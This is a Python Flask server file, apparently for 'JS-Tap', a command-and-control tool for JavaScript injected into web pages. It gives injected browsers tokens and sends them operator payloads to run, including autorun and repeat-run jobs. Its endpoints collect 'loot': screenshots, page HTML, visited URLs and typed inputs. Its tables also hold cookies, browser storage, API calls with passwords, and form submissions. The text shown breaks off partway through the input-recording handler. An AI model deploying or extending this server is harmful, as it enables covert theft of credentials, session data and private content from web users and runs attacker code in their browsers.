#!usr/bin/env python
from flask import Flask, jsonify, abort, make_response, g, request, render_template, redirect, url_for, send_from_directory
from werkzeug.serving import WSGIRequestHandler
from werkzeug.middleware.proxy_fix import ProxyFix
from flask_cors import CORS
from markupsafe import Markup, escape
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import DateTime, func, event, create_engine, orm, Column, Integer, String, DateTime, Text, Boolean, update
from sqlalchemy_utils import database_exists
from sqlalchemy.engine import Engine
from sqlalchemy.orm import scoped_session, sessionmaker, declarative_base
from flask_login import LoginManager, login_user, logout_user, UserMixin, login_required, current_user
from flask_bcrypt import Bcrypt
from filelock import FileLock, Timeout
from enum import Enum
from user_agents import parse
import magic
import json
import uuid
import os
import time
import threading
import string
import random
import shutil
import logging






# *********************************************************************

def printHeader():
    print("""
                                        ▐▄▄▄.▄▄ ·                       
             .* ./,                      ·██▐█ ▀.                 
             ,    ,,,                  ▪▄ ██▄▀▀▀█▄                                            
            *     .,.*                 ▐▌▐█▌▐█▄▪▐█                                            
           ,*      ,. *.                ▀▀▀• ▀▀▀▀              .(/,#/            
           *        *  *,         .,,.                      ,#%&&&&#            
          ./        ,,  /.          ./#%%&&&&&&&&&&&&%#((//,  ,#%%#/*           
          *,        .*  .(,               ,/#%%&&&&&&&&&&&&&#,   ,   ,.         
          #,         *.  ,(                    .*#%&&&&&&&&&&&%#*     *         
         ,#          .,   /,                  ./(#(  ,*#%%&&&&&&&&(. ,.         
         ,/          .*   ,/                 *%%#(%%%%(   .*(%%%%%&#(,          
 ./*.  ../(,,*******/,/.  ,%/////.         .(*  ,%%%%/     */  ...,%%%%/.       
 *.                 *//   ,#     *.       /,          .***,(.,/    , ,(###*     
 ,,.*,,*/(##((/*/***///   (*....,(.     *,           .*/(%%%(,(*..*.      .*/.  
          #,     .,, /*  */..(*,      ,,       .,/(/,(%%&&&&&&&&%%%/.           
          **         /. ,/  ,,*,    ,,    ,//,       */%%%%%&&&&&&%%%#*         
          .(        */ .*  .*,, , .***,.             *(/%%%%%((#%%%%%%%%#*      
           /       .(,**  *.*,. .,                   *%((%%&%&(#&%&#%%&%%%%(,   
           */      /(/, .*.(.     ,*,               .#%%//%%%&(%&&&(%&&&&&&&&%* 
            (,    *%/.  ,.**... ,..(%%(,           .(%%%#*#%&#(&&%#/&&&&&&&&&&%#
            ./   ,(, ** ..  *,,/**%%&&&%%%#/,,..  *#%%%%* *%#*%&&%((&&&&&&&&&&&&
             ,/.*,    *%(.  .  , .*#%%%%%%%&&&&/(/#%%%#,  .##%&&&%/%&&&&&&&&&&&&
                     .((/,....         ,/##%%%%&&%&%%(.    *%&&&%/%&&&&&&&&&&&&&
                                     ▄▄▄▄▄ ▄▄▄·  ▄▄▄·
                                     •██  ▐█ ▀█ ▐█ ▄█  
                                      ▐█.▪▄█▀▀█  ██▀·  
                                      ▐█▌·▐█ ▪▐▌▐█▪·•  
                                      ▀▀▀  ▀  ▀ .▀   
                                       𝚋𝚢 @𝚑𝚘𝚘𝚍𝚘𝚎𝚛
                               𝚑𝚘𝚘𝚍𝚘𝚎𝚛@𝚋𝚒𝚝𝚠𝚒𝚜𝚎𝚖𝚞𝚗𝚒𝚝𝚒𝚘𝚗𝚜.𝚍𝚎𝚟
        """)


#***************************************************************************
# Configuration

# Proxy mode
# Handy for running nginx proxy in front
# of JS-Tap server to handle SSL certs.
# If set to True
# JS-Tap will run http and rely on nginx
# Note that nginx needs to set an X-Forwarded-For 
# header or JS-Tap won't know the IP address of the cliet
# -----
# If set to False JS-Tap will use a 
# self signed cert
proxyMode    = False

# overwrite based on value in gunicorn startup script
envProxyMode = os.environ.get('PROXYMODE')
if envProxyMode:
    proxyMode = True
elif not envProxyMode:
    proxyMode = False 


# Data Directory
# File path to folder where loot directory 
# and SQLite database are saved
# Data Directory should have the trailing '/' added
dataDirectory = "./"

# overwrite based on value in gunicorn startup script
envDataDir    = os.environ.get('DATADIRECTORY')

if envDataDir is not None:
    dataDirectory = envDataDir





#***************************************************************************
# Initialization stuff
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
fh = logging.FileHandler('./logs.txt')
fh.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
fh.setFormatter(formatter)
logger.addHandler(fh)



app = Flask(__name__)
CORS(app)
baseDir = os.path.abspath(os.path.dirname(__file__))


# This variable will be set if started from gunicorn script
secretKey = os.environ.get('SESSIONKEY')

if secretKey is not None:
    app.config['SECRET_KEY'] = secretKey
else:
    app.config['SECRET_KEY'] = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=45))

login_manager = LoginManager()
login_manager.login_view = 'login'
login_manager.init_app(app)
bcrypt = Bcrypt(app)


app.config['SESSION_COOKIE_SECURE']   = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'



# Scoped Session Database setup
database_uri = 'sqlite:///' + os.path.abspath(dataDirectory + 'jsTap.db')
engine       = create_engine(database_uri, connect_args={"check_same_thread": False})
db_session   = scoped_session(sessionmaker(autocommit=False, autoflush=False, bind=engine))
Base         = declarative_base()
Base.query   = db_session.query_property()



@app.teardown_request
def remove_scoped_session(exception=None):
    db_session.remove()




#***************************************************************************
# Needed to generate human readable nicknames
AdjectiveList = {
        "funky",
        "smelly",
        "skunky",
        "merry",
        "whimsical",
        "amusing",
        "hysterical",
        "bumfuzzled",
        "bodacious",
        "absurd",
        "animated",
        "brazen",
        "cheesy",
        "clownish",
        "confident",
        "crazy",
        "cuckoo",
        "deranged",
        "ludicrous",
        "playful",
        "quirky",
        "screwball",
        "slapstick",
        "wacky",
        "excited",
        "humorous",
        "charming",
        "confident",
        "fanatical"
}

ColorList = {
        "blue",
        "red",
        "green",
        "white",
        "black",
        "brown",
        "azure",
        "pink",
        "yellow",
        "silver",
        "purple",
        "orange",
        "grey",
        "fuchsia",
        "crimson",
        "lime",
        "plum",
        "olive",
        "cyan",
        "ivory",
        "magenta"
}


MurderCritter = {
        "kangaroo",
        "koala",
        "dropbear",
        "wombat",
        "wallaby",
        "dingo",
        "emu",
        "tassiedevil",
        "platypus",
        "salty",
        "kookaburra",
        "boxjelly",
        "blueringoctopus",
        "taipan",
        "stonefish",
        "redback",
        "cassowary",
        "funnelwebspider",
        "conesnail",
        "quokka",
        "echidna",
        "dugong",
        "sugarglider",
        "blackswan"
}






#***************************************************************************
# Database classes
class Client(Base):
    __tablename__ = 'clients'

    id              = Column(Integer, primary_key=True)
    nickname        = Column(String(100), unique=True, nullable=False)
    tag             = Column(String(40), unique=False, nullable=True)
    uuid            = Column(String(40), unique=True, nullable=False)
    sessionValid    = Column(Boolean, nullable=False, default=True)
    notes           = Column(Text, nullable=True)
    firstSeen       = Column(DateTime(timezone=True),server_default=func.now())
    lastSeen        = Column(DateTime(timezone=True), server_default=func.now())
    ipAddress       = Column(String(20), nullable=True)
    platform        = Column(String(100), nullable=True)
    browser         = Column(String(100), nullable=True)
    isStarred       = Column(Boolean, nullable=False, default=False)
    hasJobs         = Column(Boolean, nullable=False, default=False)
    imageCounter    = Column(Integer, server_default='1')
    htmlCodeCounter = Column(Integer, server_default='1')


    def update(self):
        # logger.info("$$ Client Update func")
        self.lastSeen = func.now()

    def __repr__(self):
        return f'<Client {self.id}>'


# Keep screenshots as files on disk, just track the filename
class Screenshot(Base):
    __tablename__ = 'screenshots'

    id        = Column(Integer, primary_key=True)
    clientID  = Column(String(100), nullable=False)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
    fileName  = Column(String(100), nullable=False)
  
    def __repr__(self):
        return f'<Screenshot {self.id}>'


class HtmlCode(Base):
    __tablename__ = 'htmlcode'

    id        = Column(Integer, primary_key=True)
    clientID  = Column(String(100), nullable=False)
    url       = Column(Text, nullable=False)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
    fileName  = Column(String(100), nullable=False)


    def __repr__(self):
        return f'<HtmlCode {self.id}>'


class UrlVisited(Base):
    __tablename__ = 'urlsvisited'

    id        = Column(Integer, primary_key=True)
    clientID  = Column(String(100), nullable=False)
    url       = Column(Text, nullable=False)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<UrlVisited {self.id}>'


class UserInput(Base):
    __tablename__ = 'userinput'

    id         = Column(Integer, primary_key=True)
    clientID   = Column(String(100), nullable=False)
    inputName  = Column(String(100), nullable=False)
    inputValue = Column(Text, nullable=False)
    timeStamp  = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<UserInput {self.id}>'


class Cookie(Base):
    __tablename__ = 'cookies'

    id          = Column(Integer, primary_key=True)
    clientID    = Column(String(100), nullable=False)
    cookieName  = Column(Text, nullable=False)
    cookieValue = Column(Text, nullable=False)
    timeStamp   = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<Cookie {self.id}>'


class LocalStorage(Base):
    __tablename__ = 'localstorage'

    id        = Column(Integer, primary_key=True)
    clientID  = Column(String(100), nullable=False)
    key       = Column(Text, nullable=False)
    value     = Column(Text, nullable=False)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<LocalStorage {self.id}>'


class SessionStorage(Base):
    __tablename__ = 'sessionstorage'

    id        = Column(Integer, primary_key=True)
    clientID  = Column(String(100), nullable=False)
    key       = Column(Text, nullable=False)
    value     = Column(Text, nullable=False)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<SessionStorage {self.id}>'



class XhrApiCall(Base):
    __tablename__ = 'xhrapicall'

    id             = Column(Integer, primary_key=True)
    clientID       = Column(String(100), nullable=False)
    method         = Column(String(100), nullable=False)
    url            = Column(Text, nullable=False)
    asyncRequest   = Column(Boolean, default=True)
    user           = Column(String(100), nullable=True)
    password       = Column(String(100), nullable=True)
    requestBody    = Column(Text, nullable=True)
    responseBody   = Column(Text, nullable=True)
    responseStatus = Column(Integer, nullable=True)
    timeStamp      = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<XhrApiCall {self.id}>'



class XhrHeader(Base):
    __tablename__ = 'xhrheader'

    id        = Column(Integer, primary_key=True)
    apiCallID = Column(Integer, nullable=False)
    clientID  = Column(String(100), nullable=False)
    header    = Column(Text, nullable=False)
    value     = Column(Text, nullable=False)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<XhrHeader {self.id}>'



class FetchApiCall(Base):
    __tablename__ = 'fetchapicall'

    id             = Column(Integer, primary_key=True)
    clientID       = Column(String(100), nullable=False)
    method         = Column(String(100), nullable=False)
    url            = Column(Text, nullable=False)
    requestBody    = Column(Text, nullable=True)
    responseBody   = Column(Text, nullable=True)
    responseStatus = Column(Integer, nullable=True)
    timeStamp      = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<FetchApiCall {self.id}>'



class FetchHeader(Base):
    __tablename__ = 'fetchheader'

    id        = Column(Integer, primary_key=True)
    apiCallID = Column(Integer, nullable=False)
    clientID  = Column(String(100), nullable=False)
    header    = Column(Text, nullable=False)
    value     = Column(Text, nullable=False)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<FetchHeader {self.id}>'




class FormPost(Base):
    __tablename__ = 'formpost'

    id          = Column(Integer, primary_key=True)
    clientID    = Column(String(100), nullable=False)
    formName    = Column(Text, nullable=True)
    formAction  = Column(String(100), nullable=False)
    formMethod  = Column(String(12), nullable=False)
    formEncType = Column(String(100), nullable=True)
    formData    = Column(Text, nullable=True)
    url         = Column(Text, nullable=False)
    timeStamp   = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<FormPost {self.id}>'



class CustomExfil(Base):
    __tablename__ = 'customexfil'

    id        = Column(Integer, primary_key=True)
    note      = Column(Text, nullable=True)
    data      = Column(Text, nullable=True)
    timeStamp = Column(DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<CustomExfil {self.id}>'




class Event(Base):
    __tablename__ = 'events'

    id        = Column(Integer, primary_key=True)
    clientID  = Column(String(100), nullable=False)
    timeStamp = Column(DateTime(timezone=True))
    eventType = Column(String(100), nullable=False)
    eventID   = Column(Integer, nullable=False)

    def __repr__(self):
        return f'<Event {self.id}>'


# Application settings
class AppSettings(Base):
    __tablename__ = 'appsettings'

    id                = Column(Integer, primary_key=True)
    allowNewSesssions = Column(Boolean, default=True)
    clientRefreshRate = Column(Integer, default=5)

    def __repr__(self):
        return f'<AppSettings {self.id}>'



class CustomPayload(Base):
    __tablename__ = 'custompayloads'

    id          = Column(Integer, primary_key=True)
    name        = Column(String(100), nullable=False)
    description = Column(Text, nullable=True)
    code        = Column(Text, nullable=False)
    autorun     = Column(Boolean, nullable=False, default=False)
    repeatrun   = Column(Boolean, nullable=False, default=False)

    def __repr__(self):
        return f'<CustomPayload {self.id}>'

   


class ClientPayloadJob(Base):   
    __tablename__ = 'clientpayloadjobs'

    id          = Column(Integer, primary_key=True)
    clientKey   = Column(Integer, nullable=False)
    payloadKey  = Column(Integer, nullable=False)
    code        = Column(Text, nullable=False)
    repeatrun   = Column(Boolean, nullable=False, default=False)

    def __repr__(self):
        return f'<ClientPayloadJob {self.id}>'



class BlockedIP(Base):
    __tablename__ = 'blockedips'

    id  = Column(Integer, primary_key=True)
    ip  = Column(String(20), nullable=False)
  
    def __repr__(self):
        return f'<BlockedIP {self.id}>'



# User C2 UI session
class User(UserMixin, Base):
    __tablename__ = 'user'

    username       = Column(String, primary_key=True)
    password       = Column(String, nullable=False)
    authenticated  = Column(Boolean, default=False)

    def is_active(self):
        # We don't need to deactivate user accounts, but
        # this is a required method
        return True

    def get_id(self):
        return self.username

    def is_authenticated(self):
        return self.authenticated

    def is_anonymous(self):
        # Another unused but required method
        return False





#***************************************************************************
# Support Functions


# Need function to check session, return download directory
def findLootDirectory(identifier):
    client = Client.query.with_entities(Client.id).filter_by(uuid=identifier).first()

    lootDir = "client_" + str(client.id)
    #logger.info("Loot directory is: " + lootDir)
    return lootDir



def dbCommit():
    # Well, there used to be more stuff here...
    db_session.commit()




def scheduleRepeatTasks(client):
    # Check for repeat run jobs
    payloads = CustomPayload.query.filter_by(repeatrun=True)

    # get client scheduled payload
    clientPayloads = ClientPayloadJob.query.filter_by(clientKey=client.id)


    for payload in payloads:
        alreadyScheduled = False
 
        for clientPayload in clientPayloads:
            if clientPayload.payloadKey == payload.id:
                # already scheduled!
                alreadyScheduled = True
                break
        
        if not alreadyScheduled:
            newJob = ClientPayloadJob(clientKey=client.id, payloadKey = payload.id, code=payload.code, repeatrun=True)
            db_session.add(newJob)
            # logger.info('********* Just added client update repeat job: ' + client.nickname + ', ' + str(payload.id))
            dbCommit()





# Updates "last seen" timestamp"
# Do not call db commit in here
def clientSeen(identifier, ip, userAgent):
    # logger.info("!! Client seen: " + str(ip) + ', ' + userAgent)
    # logger.info("*** Starting clientSeen Update!")

    parsedUserAgent = parse(userAgent)
    # logger.info("--Browser: " + parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string)
    # logger.info("--Platform: " + parsedUserAgent.os.family)


    # DB commit is handled by caller to clientSeen() method, don't do it here
    client = Client.query.filter_by(uuid=identifier).first()
    client.ipAddress = ip
    client.platform  = parsedUserAgent.os.family
    client.browser   = parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string

    # update method touches the database lastseen timestamp
    client.update()

    # See if we have any scheduling work to do here
    scheduleRepeatTasks(client)






# Check if the UUID sent by client is valid
# and hasn't had it's session invalidated
def isClientSessionValid(identifier):
    client = Client.query.filter_by(uuid=identifier).first()
    if client:
        # Ok, valid client UUID. Check if session is still good
        if (client.sessionValid):
            return True
        else:
            return False
    else:
        # client UUID not in database, shenanigans I say
        return False



# Needed by flask-login
@login_manager.user_loader
def user_loader(username):
    return User.query.filter_by(username=username).first()


# Need an admin account
def addAdminUser():
    currentAdmin = User.query.filter_by(username='admin').first()

    # We won the multithread race, create the admin user
    if currentAdmin is None:
        passwordLength = 45

        randomPassword = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase 
            + string.digits, k=passwordLength))


        logger.info("*******************************")
        logger.info("WebApp admin creds:")
        logger.info("admin : " + randomPassword)
        logger.info("*******************************")

        adminUser = User(username='admin', password=bcrypt.generate_password_hash(randomPassword))

        db_session.add(adminUser)
        dbCommit()

        with open('./adminCreds.txt', 'w') as credFile:
            credFile.write('admin:' + randomPassword + '\n')
            credFile.close()
    else:
        # already have an admin!
        logger.info("Skipping admin add, already have one!")




# Initialize app defaults
def initApplicationDefaults():
    appSettings = AppSettings(allowNewSesssions=True, clientRefreshRate=5)

    db_session.add(appSettings)
    dbCommit()




# Generate a client nickname
# If a client already has the nickname, append a number to 
# the end so they're unique
def generateNickname():
    randomAdjective = random.choice(list(AdjectiveList))
    randomColor     = random.choice(list(ColorList))
    randomCritter   = random.choice(list(MurderCritter))

    newNickname = randomAdjective + '-' + randomColor + '-' + randomCritter

    counter = 0
    while Client.query.filter_by(nickname=newNickname).count():
        baseNickname = newNickname.replace('-'+ str(counter), '')
        # logger.info("Base nickname created: " + baseNickname)
        counter += 1


        newNickname = baseNickname + '-' + str(counter)
        # logger.info("Still looping for name, counter: " + str(counter))
        # logger.info("Current newNickname: " + newNickname)

    return newNickname






#***************************************************************************
# Database startup

# Moved from main:
# Check for existing database file
# Make sure only one process runs this
startupLock  = FileLock("./init.lock")
lockAcquired = False

try:
    startupLock.acquire(timeout=2)
    lockAcquired = True
    printHeader()
    if database_exists('sqlite:///' + os.path.abspath(dataDirectory + 'jsTap.db')):
        with app.app_context():
            logger.info("!! SQLite database already exists:")
            clients = Client.query.all()
            numClients = len(clients)

            users = User.query.all()
            numUsers = len(users)

            logger.info("Existing database has " + str(numClients) + " clients and " 
                + str(numUsers) + " users.")

            # Generate a new admin user
            logger.info("Creating tables!")
            User.__table__.drop(engine)
            Base.metadata.create_all(engine)
            dbCommit()
            addAdminUser()

            # If we're being run from the gunicorn start script this will be set by that
            clientSaveSetting = os.environ.get('CLIENTDATA')


            if numClients != 0:
                val = ""

                # See if we're started from gunicorn startup script
                if clientSaveSetting is not None:
                    if clientSaveSetting == 'KEEP':
                        val = 1
                    elif clientSaveSetting == 'DELETE':
                        val = 2
                else:
                    # apparently running developer mode directly
                    print("Make selection on how to handle existing clients:")
                    print("1 - Keep existing client data")
                    print("2 - Delete all client data and start fresh")

                    val = int(input("\nSelection: "))


                if val == 2:
                    logger.info("Clearing client data")
                    Client.__table__.drop(engine)
                    Screenshot.__table__.drop(engine)
                    HtmlCode.__table__.drop(engine)
                    UrlVisited.__table__.drop(engine)
                    UserInput.__table__.drop(engine)
                    Cookie.__table__.drop(engine)
                    LocalStorage.__table__.drop(engine)
                    SessionStorage.__table__.drop(engine)
                    XhrApiCall.__table__.drop(engine)
                    XhrHeader.__table__.drop(engine)
                    FetchApiCall.__table__.drop(engine)
                    FetchHeader.__table__.drop(engine)
                    Event.__table__.drop(engine)
                    FormPost.__table__.drop(engine)
                    CustomExfil.__table__.drop(engine)
                    ClientPayloadJob.__table__.drop(engine)
                    dbCommit()

                    Base.metadata.create_all(engine)

                    if os.path.exists(dataDirectory + "lootFiles"):
                        shutil.rmtree(dataDirectory + "lootFiles")

                elif val == 1:
                    logger.info("Keeping existing client data.")
                else:
                    print("Invalid selection.")
                    exit()


    else:
        logger.info("No database found")
        logger.info("... creating database...")
        with app.app_context():
            Base.metadata.drop_all(engine)
            Base.metadata.create_all(engine)

            if os.path.exists(dataDirectory + "lootFiles"):
                shutil.rmtree(dataDirectory + "lootFiles")
            dbCommit()
            addAdminUser()
            initApplicationDefaults()



    # Check for loot directory
    if not os.path.exists(dataDirectory + "lootFiles"):
        os.mkdir(dataDirectory + "lootFiles")


    # Set our journaling mode to wright ahead log
    @event.listens_for(Engine, "connect")
    def set_sqlite_pragma(dbapi_connection, connection_record):
        cursor = dbapi_connection.cursor()
        cursor.execute("PRAGMA journal_mode=WAL;")
        cursor.execute("PRAGMA synchronous=normal;")
        cursor.execute("PRAGMA cache_size = -20971520;") # 20MB
        cursor.close()

    # Need the other threads to move on beyond the init code
    time.sleep(5)


except Timeout:
    logger.info("Server process skipping redundant startup initialization")

finally:
    if lockAcquired:
        logger.info("Releasing startup filelock")
        startupLock.release()
        logger.info("************************************")
        logger.info("JS-Tap Server Online - Happy Hunting")
        logger.info("************************************")




#***************************************************************************
# Response header handling
@app.after_request
def afterRequestHeaders(response):
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['X-Content-Type-Options']    = 'nosniff'
    response.headers['X-Frame-Options']           = 'DENY'
    response.headers['Content-Security-Policy']   = "default-src 'self' style-src 'self' script-src 'self' connect-sec 'self' img-src 'self' data: frame-ancestors 'none' object-src 'self'  'unsafe-inline'"

    # Server header is set in main function
 
    return response




# Page Endpoints


# Serve up a whole directory just for different configurations 
# of JS-Tap payloads. No authentication required to pull these in
# Have different ones/configurations for different applications
# Put your payloads in thte ./payloads directory. 
@app.route('/lib/<path:filename>')
def servePayloads(filename):
    response = send_from_directory('./payloads', filename)

    response.headers['Content-Type'] = 'text/javascript'

    return response



# Send c2 UI index page
@app.route('/', methods=['GET'])
@login_required
def sendIndex():
    with open('./index.html', 'r') as file:
        index = file.read()
        response = make_response(index, 200)
        #response.mimetype('text/html')

        return response



# Serve up loot files
# for images and HTML code
@app.route('/lootFiles/<path:path>')
@login_required
def sendLootFile(path):

    # If HTML the user needs to download it the loot file, not render it
    # Rendering the HTML copy in the browswer will likely hit the target server
    # with CSS/JavaScript requests from our browser. No good. 
    if "htmlCopy.html" in path:
        # logger.info("### We're serving up stolent HTML!")
        return send_from_directory(dataDirectory + 'lootFiles', path, as_attachment=True)
    else:
        # Just display the screenshot in the browser, this is safe
        # logger.info("#### Serving up screenshot!")    
        return send_from_directory(dataDirectory + 'lootFiles', path)


# Serve up static files
# that need to be authenticated
@app.route('/protectedStatic/<path:path>')
@login_required
def sendProtectedStaticFile(path):
    return send_from_directory('protectedStatic', path)





@app.route('/login', methods=['POST', 'GET'])
def login():
    logger.info("Top of login...")

    if request.method == 'GET':
        logger.info("** Handling login GET...")
        with open('./login.html', 'r') as file:
            loginForm = file.read()
            response = make_response(loginForm, 200)
            #response.mimetype('text/html')

            return response


    if request.method == 'POST':
        logger.info("** Handling login POST...")
        username = request.form['username']
        password = request.form['password']

        user = User.query.filter_by(username=username).first()

        if user:
            isValidPassword = bcrypt.check_password_hash(user.password, password) 

            if isValidPassword:
                logger.info("Password matched!")
                login_user(user)
                return redirect(url_for('sendIndex'))
                # response = make_response("Successful login.", 200)
                # return response
            else:
                logger.info("Auth: Password didn't match")
                response = make_response("No.", 401)
                return response
                logger.info("Password didn't match :(")
        else:
            # Make sure equal processing time, avoiding time based user enum
            hash = bcrypt.generate_password_hash(password)

            logger.info("Auth: User not found")
            response = make_response("No.", 401)
            return response



@app.route('/logout', methods=['GET'])
def logout():
    logout_user()
    return redirect("login")


#***************************************************************************
# Loot and Payload Client API endpoints

# Get UUID for client token
@app.route('/client/getToken', methods=['GET'])
@app.route('/client/getToken/<tag>', methods=['GET'])
def returnUUID(tag=''):
    # Check to see if we're still allowing new client connections
    appSettings = AppSettings.query.filter_by(id=1).first()

    # logger.info("In UUID, app setting is: " + str(appSettings.allowNewSesssions))
    if (appSettings.allowNewSesssions == False):
        return "No.", 401

    # Is this IP blocked?
    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr
    blockedIP = BlockedIP.query.filter_by(ip=ip).first()
    if blockedIP is not None:
        return "No.", 401


    # We're still allowing new connections, 
    # setup a new client
    token = str(uuid.uuid4())

    logger.info("New session for client: " + token)


    # Database Entry
    newNickname = generateNickname()
    newClient   = Client(uuid=str(token), nickname=newNickname, tag=tag, notes="")
    db_session.add(newClient)
    db_session.commit()

    # Initialize our storage
    lootPath = dataDirectory + 'lootFiles/client_' + str(newClient.id)

    if not os.path.exists(lootPath):
        #logger.info("Creating directory...")
        os.mkdir(lootPath)

        # Record the client index
        clientFile = open(dataDirectory + "lootFiles/clients.txt", "a")
        clientFile.write(str(time.time()) + ", " + token + ": " + lootPath + "\n")
        clientFile.close()
    # threadLock.release()

    # Add any autorun payloads for this client
    payloads = CustomPayload.query.filter_by(autorun=True)
    client   = Client.query.filter_by(uuid=token).first()

    for payload in payloads:
        newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code)
        db_session.add(newJob)
    dbCommit()

    uuidData = {'clientToken':token}

    return jsonify(uuidData)



# Check for custom payload jobs for the client
@app.route('/client/taskCheck/<identifier>', methods=['GET'])
def returnPayloads(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    client = Client.query.filter_by(uuid=identifier).first()

    # Make sure we run the repeat run scheduler
    scheduleRepeatTasks(client)

    dbChange = False

    payloads = ClientPayloadJob.query.filter_by(clientKey=client.id).all()


    taskedPayloads = [{'id':payload.id, 'data':payload.code} for payload in payloads]

    for payload in payloads:
        # logger.info("Payload found: " + str(payload.id))
        # only delete if it's repeatrun is set to no
        if payload.repeatrun == False:
            db_session.delete(payload)
            dbChange = True
    
    # Useful for UI feedback
    if payloads:
        if not client.hasJobs:
            dbChange = True
            client.hasJobs = True
    else:
        if client.hasJobs:
            dbChange = True
            client.hasJobs = False

    if dbChange:
        dbCommit()

    return jsonify(taskedPayloads)





# Capture screenshot
@app.route('/loot/screenshot/<identifier>', methods=['POST'])
def recordScreenshot(identifier):
    # logger.info("Received image from: " + identifier)
    #logger.info("Looking up loot dir...")

    if not isClientSessionValid(identifier):
        return "No.", 401


    lootDir   = findLootDirectory(identifier)
    image     = request.data
    file_type = magic.from_buffer(image, mime=True)

    # Make sure the html2canvas screenshot is 
    # what we're expecting. Definitely don't want SVGs
    if file_type != 'image/png':
        # Shenanigans from the 'client' are afoot
        logger.error("!!!! Wrong screenshot filetype!")
        logger.error("---- Type: " + file_type)
        return "No.", 401


    client = Client.query.with_entities(Client.imageCounter).filter_by(uuid=identifier).first()

    imageNumber = client[0]


    #logger.info("Writing the file to disk...")
    with open (dataDirectory + "lootFiles/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png", "wb") as binary_file:
        binary_file.write(image)
        binary_file.close()

    # Put it in the DB
    newScreenshot = Screenshot(clientID=identifier, fileName="./lootFiles/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png")
    db_session.add(newScreenshot)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    db_session.execute(update(Client).where(Client.uuid == identifier).values(imageCounter=Client.imageCounter+1))
    dbCommit()

    # add to global event table
    db_session.refresh(newScreenshot)
    newEvent = Event(clientID=identifier, timeStamp=newScreenshot.timeStamp, 
    eventType='SCREENSHOT', eventID=newScreenshot.id)
    db_session.add(newEvent)
    dbCommit()



    return "ok", 200



# Capture the HTML seen
@app.route('/loot/html/<identifier>', methods=['POST'])
def recordHTML(identifier):
    # logger.info("Got HTML from: " + identifier)

    if not isClientSessionValid(identifier):
        return "No.", 401

    lootDir = findLootDirectory(identifier)
    content = request.json 
    url = content['url']
    trapHTML = content['html']

    client = Client.query.with_entities(Client.htmlCodeCounter).filter_by(uuid=identifier).first()

    htmlNumber = client[0]

    lootFile = dataDirectory + "lootFiles/" + lootDir + "/" + str(htmlNumber) + "_htmlCopy.html"

    with open (lootFile, "w") as html_file:
        html_file.write(trapHTML)
        html_file.close()


    # Put it in the DB
    newHtml = HtmlCode(clientID=identifier, url=content['url'],fileName = lootFile)
    db_session.add(newHtml)


    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr


    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    db_session.execute(update(Client).where(Client.uuid == identifier).values(htmlCodeCounter=Client.htmlCodeCounter+1))
    dbCommit()

    # add to global event table
    db_session.refresh(newHtml)
    newEvent = Event(clientID=identifier, timeStamp=newHtml.timeStamp, 
        eventType='HTML', eventID=newHtml.id)
    db_session.add(newEvent)
    dbCommit()


    return "ok", 200




# Record new URL visited in trap
@app.route('/loot/location/<identifier>', methods=['POST'])
def recordUrl(identifier):
    # logger.info("New URL recorded from: " + identifier)
    if not isClientSessionValid(identifier):
        return "No.", 401

    lootDir = findLootDirectory(identifier)
    content = request.json
    url = content['url']
    # logger.info("Got URL: " + url)

    # Put it in the DB
    newUrl = UrlVisited(clientID=identifier, url=content['url'])
    db_session.add(newUrl)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db_session.refresh(newUrl)
    newEvent = Event(clientID=identifier, timeStamp=newUrl.timeStamp, 
    eventType='URLVISITED', eventID=newUrl.id)
    db_session.add(newEvent)
    dbCommit()

    return "ok", 200




# Record user inputs
@app.route('/loot/input/<identifier>', methods=['POST'])
def recordInput(identifier):
    # logger.info("New input recorded from: " + identifier)
    if not isClientSessionValid(identifier):
        return "No.", 401

    lootDir = findLootDirectory(identifier)
    content = request.json
    inputName = content['inputName']
    inputValue = content['inputValue']
    # logger.info("Got input: " + inputName + ", value: " + inputValue)


    # Put it in the DB
    newInput = UserInput(clientID=identifier, inputName=content['inputName'], inputValue=content['inputValue'])
    db_session.add(newInput)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db_session.refresh(newInput)
    newEvent = Event(clientID=identifier, timeStamp=newInput.timeStamp, 
